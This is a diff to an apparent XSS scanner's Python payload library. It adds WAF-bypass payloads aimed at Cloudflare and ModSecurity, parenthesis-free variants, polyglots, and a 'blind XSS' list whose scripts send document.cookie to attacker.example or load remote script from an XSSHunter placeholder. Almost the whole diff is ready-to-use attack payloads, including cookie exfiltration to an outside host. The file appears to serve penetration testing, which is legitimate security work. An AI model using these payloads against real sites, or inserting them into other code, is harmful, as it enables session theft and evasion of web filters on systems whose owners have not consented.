@@ -229,6 +229,24 @@ FILTER_BYPASS: List[Payload] = [
     # 이벤트 핸들러 대체
     {"type": "REFLECTED_XSS", "family": "onpointerover",        "payload": '<p onpointerover=alert(1)>hover me</p>'},
     {"type": "REFLECTED_XSS", "family": "onanimationstart",     "payload": '<style>@keyframes x{}</style><p style="animation-name:x" onanimationstart=alert(1)>'},
+    # WAF 우회 (Cloudflare / ModSecurity)
+    {"type": "REFLECTED_XSS", "family": "waf_entity_onerror",   "payload": '<img src=x onerror=&#97;lert(1)>'},
+    {"type": "REFLECTED_XSS", "family": "waf_window_concat",    "payload": "<img src=x onerror=window['ale'+'rt'](1)>"},
+    {"type": "REFLECTED_XSS", "family": "waf_href_tab",         "payload": '<a href="java&#9;script:alert(1)">x</a>'},
+    {"type": "REFLECTED_XSS", "family": "waf_iframe_tab",       "payload": '<iframe src="jav&#x09;ascript:alert(1)">'},
+    {"type": "REFLECTED_XSS", "family": "waf_svg_script",       "payload": '<svg><script>alert(1)</script></svg>'},
+    {"type": "REFLECTED_XSS", "family": "waf_hex_entity",       "payload": '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x31&#x29>'},
+    # 괄호 없는 우회 (Without Parentheses)
+    {"type": "REFLECTED_XSS", "family": "no_paren_throw",       "payload": '<script>onerror=alert;throw 1</script>'},
+    {"type": "REFLECTED_XSS", "family": "no_paren_throw_comma", "payload": '<script>throw onerror=alert,1</script>'},
+    {"type": "REFLECTED_XSS", "family": "no_paren_onerror_eval","payload": "<svg onload=\"window.onerror=eval;throw'=alert(1)'\">"},
+    {"type": "REFLECTED_XSS", "family": "no_paren_encoded",     "payload": '<svg><script>alert&#40;1&#41;</script></svg>'},
+    # payload-box/xss-payload-list — Cloudflare 우회
+    {"type": "REFLECTED_XSS", "family": "cf_null_byte_script",  "payload": "<script>%00alert(1)</script>"},
+    # payload-box/xss-payload-list — ModSecurity 우회
+    {"type": "REFLECTED_XSS", "family": "mod_eval_concat",      "payload": "<script>eval('al'+'ert(1)')</script>"},
+    {"type": "REFLECTED_XSS", "family": "mod_nested_tag",       "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>"},
+    {"type": "REFLECTED_XSS", "family": "mod_space_eq",         "payload": "<img src = x onerror = alert(1)>"},
 ]
 
 #  12. STORED — Stored XSS 특화 (저장용 페이로드) 
@@ -279,7 +297,40 @@ DOM_SINK: List[Payload] = [
 ]
 
 
-#  헬퍼 
+# ── 15. BLIND_XSS — 외부 콜백 기반 Blind XSS ────────────────────────────────
+# 페이로드가 실행되면 외부 서버로 콜백을 날려 실행 여부 확인
+# attacker.example → 실제 테스트 시 XSSHunter / interactsh 등으로 교체
+BLIND_XSS: List[Payload] = [
+    {"type": "STORED_XSS", "family": "blind_fetch_cookie",    "payload": "<script>fetch('https://attacker.example/?c='+document.cookie)</script>"},
+    {"type": "STORED_XSS", "family": "blind_fetch_info",      "payload": "<script>fetch('https://attacker.example/?d='+document.domain+'&u='+location.href)</script>"},
+    {"type": "STORED_XSS", "family": "blind_img_callback",    "payload": '<img src=x onerror="new Image().src=\'https://attacker.example/?c=\'+document.cookie">'},
+    {"type": "STORED_XSS", "family": "blind_svg_fetch",       "payload": '<svg onload="fetch(\'https://attacker.example/?c=\'+document.cookie)">'},
+    {"type": "STORED_XSS", "family": "blind_xhr",             "payload": "<script>var x=new XMLHttpRequest();x.open('GET','https://attacker.example/?c='+document.cookie,true);x.send();</script>"},
+    {"type": "STORED_XSS", "family": "blind_img_btoa",        "payload": '<img src=x onerror="fetch(\'https://attacker.example/?c=\'+btoa(document.cookie))">'},
+    {"type": "STORED_XSS", "family": "blind_break_fetch",     "payload": '"><script>fetch("https://attacker.example/?c="+document.cookie)</script>'},
+    {"type": "STORED_XSS", "family": "blind_location",        "payload": '<script>document.location="https://attacker.example/?c="+document.cookie</script>'},
+    # payload-box/xss-payload-list — XSSHunter 패턴 (원격 스크립트 로드)
+    {"type": "STORED_XSS", "family": "blind_xsshunter_basic", "payload": "<script src=//YourXSSHunterDomain></script>"},
+    {"type": "STORED_XSS", "family": "blind_xsshunter_break", "payload": '"><script src=//YourXSSHunterDomain></script>'},
+    {"type": "STORED_XSS", "family": "blind_xsshunter_sq",    "payload": "'><script src=//YourXSSHunterDomain></script>"},
+    {"type": "STORED_XSS", "family": "blind_img_new_image",   "payload": '<script>var i=new Image;i.src="https://attacker.example/?c="+document.cookie;</script>'},
+    {"type": "STORED_XSS", "family": "blind_svg_new_image",   "payload": "<svg onload=\"var i=new Image;i.src='https://attacker.example/?c='+document.cookie\">"},
+    {"type": "STORED_XSS", "family": "blind_xsshunter_eval",  "payload": "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'//YourXSSHunterDomain\\';document.body.appendChild(a)')"},
+]
+
+# ── 16. POLYGLOT — 다중 컨텍스트 동시 실행 ───────────────────────────────────
+# 컨텍스트 불명확 시 여러 상황을 동시에 커버
+POLYGLOT: List[Payload] = [
+    {"type": "REFLECTED_XSS", "family": "poly_classic",       "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"},
+    {"type": "REFLECTED_XSS", "family": "poly_js_html",       "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"},
+    {"type": "REFLECTED_XSS", "family": "poly_quote_break",   "payload": "'\"--><img src=x onerror=alert(1)>"},
+    {"type": "REFLECTED_XSS", "family": "poly_close_tags",    "payload": "'\">></style></script><svg onload=alert(1)>"},
+    {"type": "REFLECTED_XSS", "family": "poly_all_context",   "payload": "<script>alert(1)</script><img src=x onerror=alert(1)>\"><svg onload=alert(1)>"},
+    {"type": "REFLECTED_XSS", "family": "poly_attr_js_html",  "payload": "\"-alert(1)-\""},
+]
+
+
+#  헬퍼
 
 def _limit(payloads: List[Payload], strength: str) -> List[Payload]:
     """강도별 페이로드 수 제한"""
@@ -315,9 +366,12 @@ CONTEXT_MAP: Dict[str, List[Payload]] = {
     "stored":        STORED,
     "open_redirect": OPEN_REDIRECT,
     "dom":           DOM_SINK,
+    "blind":         BLIND_XSS,
+    "blind_xss":     BLIND_XSS,
+    "polyglot":      POLYGLOT,
     # 별칭
     "reflected":     _dedupe([ATTR_VALUE, BODY, SCRIPT_CONTEXT]),
-    "unknown":       _dedupe([BODY, ATTR_VALUE, FILTER_BYPASS]),
+    "unknown":       _dedupe([POLYGLOT, BODY, ATTR_VALUE, FILTER_BYPASS]),
     "none":          [],
 }
 
@@ -345,6 +399,8 @@ def get_all() -> List[Payload]:
         STORED,
         OPEN_REDIRECT,
         DOM_SINK,
+        BLIND_XSS,
+        POLYGLOT,
     ])
 
 
